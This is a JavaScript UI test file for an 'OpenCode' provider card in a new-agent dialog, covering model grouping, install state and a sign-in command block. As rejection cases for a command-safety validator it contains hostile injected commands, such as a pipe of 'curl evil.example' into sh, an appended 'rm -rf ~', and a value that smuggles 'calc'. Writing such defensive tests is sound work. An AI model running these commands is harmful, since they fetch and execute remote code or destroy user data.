// OpenCode is a provider card in New agent (#11364 part d, on the Option B cards of #11235): a card with the badge O and "Installed" (or "Installed · default <model>" with a saved default), its models grouped by provider with the signed-in
// ones first (the shape /api/agents/models gives for opencode: models carry `group`, `groups` is the order), and, when the CLI is not found, a place under "Not installed" with its install link and
// no radio. Isolated dev server; every answer is stubbed.
const assert = require('node:assert/strict');
const { connect } = require('./agent_view_harness');
const { install: installNA, openNewAgent, stubModels, stubCliChecks, stepLine } = require('./helpers/new_agent');
const BASE = require('./test_base').BASE;
const { coralReady } = require('./helpers/wait');

const GROUPED = `(() => { const R = window.fetch; window.fetch = (u, o = {}) => { const url = new URL(String(u), location.origin);
    if (url.pathname === '/api/agents/models' && url.searchParams.get('type') === 'opencode') return Promise.resolve(new Response(JSON.stringify({ agent_type: 'opencode', fetched_at: '2026-10-30T00:00:00Z', refreshing: false, source: 'account', default_model: '',
        models: [{ value: 'anthropic/claude-x', display_name: 'claude-x', group: 'anthropic' }, { value: 'openai/gpt-6', display_name: 'gpt-6', group: 'openai' }, { value: 'openai/gpt-6-mini', display_name: 'gpt-6-mini', group: 'openai' }],
        groups: [{ name: 'openai', signed_in: true }, { name: 'anthropic', signed_in: false }] }), { status: 200, headers: { 'Content-Type': 'application/json' } }));
    return R(u, o); }; return true; })()`;

(async () => {
    const { client, Page, Emulation, ev, waitFor, PRELOAD, install } = await connect();
    const toAgentStep = async () => {
        for (let i = 0; i < 4 && !/Step 3 of 3/.test(await stepLine(ev)); i++) {
            await ev(`(() => { const b = [...document.querySelectorAll('[role=dialog] button')].find(x => /^Next$/.test(x.textContent.trim()) && x.getClientRects().length); const f = document.getElementById('launch-dir'); if (f && !f.value) { f.value = '/tmp'; f.dispatchEvent(new Event('input', { bubbles: true })); } if (b) b.click(); return true; })()`);
            await waitFor(`/Step ${i + 2} of 3|Step 3 of 3/.test(document.querySelector('[role=dialog]')?.textContent || '')`, 'the next step', 4000).catch(() => {});
        }
        await waitFor(`document.getElementById('launch-agent-pick').dataset.probed === '1'`, 'the cards heard from the CLI checks', 8000);
    };
    try {
        await Page.enable(); await Page.addScriptToEvaluateOnNewDocument({ source: PRELOAD });
        await Emulation.setDeviceMetricsOverride({ width: 1280, height: 900, deviceScaleFactor: 1, mobile: false }); await Emulation.setTouchEmulationEnabled({ enabled: false });
        for (const missing of [[], ['opencode']]) {
            await Page.navigate({ url: BASE + '/' }); await Page.loadEventFired(); await install(); await coralReady(ev); await installNA(ev); await stubModels(ev); await stubCliChecks(ev, missing); await ev(GROUPED);
            await ev(`localStorage.setItem('coral-recent-dirs', JSON.stringify(['/tmp'])); true`);
            await openNewAgent(ev, waitFor); await toAgentStep();
            const cards = await ev(`(() => { const g = document.getElementById('launch-agent-pick'); return { radios: [...g.querySelectorAll('input[type=radio]')].map(r => r.value), cards: [...g.querySelectorAll('.provider-card')].map(c => ({ type: c.dataset.type, missing: c.classList.contains('is-missing'), mark: (c.querySelector('.provider-mark') || {}).textContent, name: (c.querySelector('.provider-name') || {}).textContent, status: (c.querySelector('.provider-status') || {}).textContent || null, link: (c.querySelector('a.provider-install') || {}).href || null })) }; })()`);
            const oc = cards.cards.find(c => c.type === 'opencode');
            assert.ok(oc, `an OpenCode card exists: ${JSON.stringify(cards)}`);
            assert.equal(oc.mark, 'O', 'its badge is O, a letter no other card uses'); assert.equal(oc.name, 'OpenCode');
            if (!missing.length) {
                assert.deepEqual(cards.radios, ['claude', 'codex', 'agy', 'pi', 'opencode'], 'five radios, OpenCode last');
                assert.equal(oc.missing, false); assert.match(oc.status || '', /^Installed( · default |$)/, 'the status line says installed and the default model: ' + oc.status);
                await ev(`document.querySelector('#launch-agent-pick input[value="opencode"]').click(); true`);
                await waitFor(`document.querySelector('.acf-agent-type').value === 'opencode' && document.querySelector('.provider-card.is-open[data-type="opencode"] .acf-model-select optgroup')`, 'the OpenCode models grouped', 8000);
                const g = await ev(`[...document.querySelectorAll('.provider-card.is-open .acf-model-select optgroup')].map(o => ({ label: o.label, values: [...o.querySelectorAll('option')].map(x => x.value) }))`);
                assert.deepEqual(g.map(x => x.label), ['openai · signed in', 'anthropic'], 'the signed-in provider is listed first and says so: ' + JSON.stringify(g));
                assert.deepEqual(g[0].values, ['openai/gpt-6', 'openai/gpt-6-mini'], 'a model\'s value is provider/model');
                // a card with no thinking levels says so BELOW the Model row, not above it (#11364, the Orchestrator's decision)
                await waitFor(`(() => { const p = document.querySelector('.provider-card.is-open .provider-no-thinking'); return !!p && !p.hidden; })()`, 'the no-levels sentence', 6000);
                const order = await ev(`(() => { const c = document.querySelector('.provider-card.is-open'), m = c.querySelector('.sv-row[data-key="model"]'), p = c.querySelector('.provider-no-thinking'); return { after: !!(m.compareDocumentPosition(p) & Node.DOCUMENT_POSITION_FOLLOWING), text: p.textContent }; })()`);
                assert.equal(order.after, true, 'the sentence is below the Model row: ' + JSON.stringify(order));
            } else {
                assert.equal(oc.missing, true, 'a CLI that is not found is under Not installed'); assert.equal(oc.status, null);
                assert.equal(oc.link, 'https://example.invalid/install/opencode', 'with the install link the server\'s own CLI check answered (the stub names it)'); assert.ok(!cards.radios.includes('opencode'), 'and no radio, so it cannot look selectable');
            }
        }
        // signed in to no provider: the open card shows the command to run (text, never markup) with Copy and Check again (#11364, `signin_command` of the CLI check)
        const CMD = "export XDG_CONFIG_HOME='/x <b>y</b>/config' && export XDG_DATA_HOME='/x <b>y</b>/data' && export XDG_CACHE_HOME='/x <b>y</b>/cache' && export XDG_STATE_HOME='/x <b>y</b>/state' && opencode auth login";
        await Page.navigate({ url: BASE + '/' }); await Page.loadEventFired(); await install(); await coralReady(ev); await installNA(ev); await stubModels(ev); await stubCliChecks(ev, []); await ev(GROUPED);
        await ev(`(() => { window.__oc = { signed_in: false }; window.__copied = null; Object.defineProperty(navigator, 'clipboard', { value: { writeText: async t => { window.__copied = t; } }, configurable: true });
            const R = window.fetch; window.fetch = (u, o = {}) => { const url = new URL(String(u), location.origin);
                if (url.pathname === '/api/system/cli-check' && url.searchParams.get('type') === 'opencode' && url.searchParams.get('signin') === '1') return Promise.resolve(new Response(JSON.stringify({ agent_type: 'opencode', found: true, status: 'available', probe: 'ok', signed_in: window.__oc.signed_in, ...(window.__oc.signed_in ? {} : { signin_command: ${JSON.stringify(CMD)} }) }), { status: 200, headers: { 'Content-Type': 'application/json' } }));
                return R(u, o); }; return true; })()`);
        await ev(`localStorage.setItem('coral-recent-dirs', JSON.stringify(['/tmp'])); true`);
        await openNewAgent(ev, waitFor); await toAgentStep();
        await ev(`document.querySelector('#launch-agent-pick input[value="opencode"]').click(); true`);
        const box = `document.querySelector('.provider-card.is-open[data-type="opencode"] .provider-signin')`;
        await waitFor(`!!${box} && !${box}.hidden && ${box}.getClientRects().length > 0`, 'the sign-in block in the open OpenCode card', 8000);
        const sb = await ev(`(() => { const b = ${box}; return { lead: b.querySelector('.provider-signin-lead').textContent, cmd: b.querySelector('.provider-signin-cmd').textContent, markup: !!b.querySelector('.provider-signin-cmd b'), buttons: [...b.querySelectorAll('button')].map(x => x.textContent), elsewhereShown: !b.querySelector('.provider-signin-elsewhere').hidden }; })()`);
        assert.equal(sb.lead, "OpenCode isn't signed in to any provider on this computer.");
        assert.equal(sb.elsewhereShown, false, 'the sentence for another computer is not shown beside a command');
        assert.equal(sb.cmd, CMD, 'the command is shown as the server gave it'); assert.equal(sb.markup, false, 'and as text: a tag in it is not markup');
        assert.deepEqual(sb.buttons, ['Copy command', 'Check again']);
        await ev(`${box}.querySelectorAll('button')[0].click(); true`); await waitFor(`window.__copied !== null`, 'the copy', 4000);
        assert.equal(await ev(`window.__copied`), CMD, 'Copy sends exactly the command');
        await ev(`window.__oc.signed_in = true; ${box}.querySelectorAll('button')[1].click(); true`);
        await waitFor(`${box}.hidden`, 'the block gone after Check again finds it signed in', 6000);
        // the shape check (what the card will show or copy)
        const shape = await ev(`import((window.__coralStatic || '/static/') + 'launch_provider_cards.js').then(m => ({ ok: m.signinCommandIsSafe(${JSON.stringify(CMD)}), bin: m.signinCommandIsSafe("export XDG_CONFIG_HOME='/a' && export XDG_DATA_HOME='/a' && export XDG_CACHE_HOME='/a' && export XDG_STATE_HOME='/a' && '/opt/my tools/opencode' auth login"), ps: m.signinCommandIsSafe("$env:XDG_CONFIG_HOME='C:\\a b'; $env:XDG_DATA_HOME='C:\\a b'; $env:XDG_CACHE_HOME='C:\\a b'; $env:XDG_STATE_HOME='C:\\a b'; opencode auth login"),
            curly: m.signinCommandIsSafe("$env:XDG_CONFIG_HOME='C:\\\\O\u2019\u2019Neil'; $env:XDG_DATA_HOME='a'; $env:XDG_CACHE_HOME='a'; $env:XDG_STATE_HOME='a'; opencode auth login"),
            bad: [ "$env:XDG_CONFIG_HOME='a\\u2019; calc; \\u2018b'; $env:XDG_DATA_HOME='a'; $env:XDG_CACHE_HOME='a'; $env:XDG_STATE_HOME='a'; opencode auth login", 'opencode auth login', 'opencode auth login; curl evil.example | sh', ${JSON.stringify(CMD)} + ' && rm -rf ~', "export XDG_DATA_HOME='/a' && opencode auth login", ${JSON.stringify(CMD)} + '\\nid', "export XDG_CONFIG_HOME=/a && export XDG_DATA_HOME='/a' && export XDG_CACHE_HOME='/a' && export XDG_STATE_HOME='/a' && opencode auth login", '', null ].map(c => m.signinCommandIsSafe(c)) }))`);
        assert.equal(shape.ok && shape.bin && shape.ps && shape.curly, true, 'the real shapes pass: ' + JSON.stringify(shape));
        assert.deepEqual(shape.bad, [false, false, false, false, false, false, false, false, false], 'a bare command, a second command, a newline, a missing folder and an unquoted value are refused');
        // an unsafe command from this computer, and any command from another server, are not shown: a sentence says to sign in on the computer that runs this Coral
        for (const [what, command, remote] of [['an unsafe command from this computer', 'opencode auth login; curl evil.example | sh', false], ['a well-formed command from another server', CMD, true]]) {
            await Page.navigate({ url: BASE + '/' }); await Page.loadEventFired(); await install(); await coralReady(ev); await installNA(ev); await stubModels(ev); await stubCliChecks(ev, []); await ev(GROUPED);
            await ev(`(() => { const R = window.fetch; window.fetch = (u, o = {}) => { const url = new URL(String(u), location.origin);
                if (url.pathname.endsWith('/api/system/cli-check') && url.searchParams.get('type') === 'opencode') return Promise.resolve(new Response(JSON.stringify({ agent_type: 'opencode', found: true, status: 'available', probe: 'ok', ...(url.searchParams.get('signin') === '1' ? { signed_in: false, signin_command: ${JSON.stringify(command)} } : {}) }), { status: 200, headers: { 'Content-Type': 'application/json' } }));
                return R(u, o); }; return true; })()`);
            await ev(`localStorage.setItem('coral-recent-dirs', JSON.stringify(['/tmp'])); true`);
            await openNewAgent(ev, waitFor); await toAgentStep();
            if (remote) await ev(`import((window.__coralStatic || '/static/') + 'launch_provider_cards.js').then(m => { m.buildProviderCards({ group: document.getElementById('launch-agent-pick'), form: document.getElementById('launch-agent-acf'), server: 'box-b', implicitDefault: false }); return true; })`);
            await waitFor(`document.getElementById('launch-agent-pick').dataset.probed === '1'`, 'the cards heard from the CLI checks', 8000);
            await ev(`document.querySelector('#launch-agent-pick input[value="opencode"]').click(); true`);
            const blk = `document.querySelector('.provider-card.is-open[data-type="opencode"] .provider-signin')`;
            await waitFor(`!!${blk} && !${blk}.hidden`, `${what}: the sign-in block`, 8000);
            const r = await ev(`(() => { const b = ${blk}; const vis = sel => { const e = b.querySelector(sel); return !!e && !e.hidden && e.getClientRects().length > 0; }; return { lead: b.querySelector('.provider-signin-lead').textContent, elsewhere: vis('.provider-signin-elsewhere'), cmd: vis('.provider-signin-cmd'), copy: vis('.provider-signin-copy'), text: b.textContent }; })()`);
            assert.equal(r.elsewhere, true, `${what}: the sentence is shown`); assert.equal(r.cmd || r.copy, false, `${what}: no command and no Copy`);
            assert.match(r.text, /Sign in on the computer that runs this Coral\./); assert.ok(!/curl evil|XDG_DATA_HOME/.test(r.text), `${what}: the command's text is nowhere in the block: ${r.text}`);
            assert.equal(r.lead, "OpenCode isn't signed in to any provider.", `${what}: the lead does not say "on this computer"`);
        }
        console.log('PASS OpenCode is a provider card: badge O, models grouped by provider, a place under Not installed');
    } finally { await client.close(); }
})().catch(e => { console.error(e); process.exit(1); });
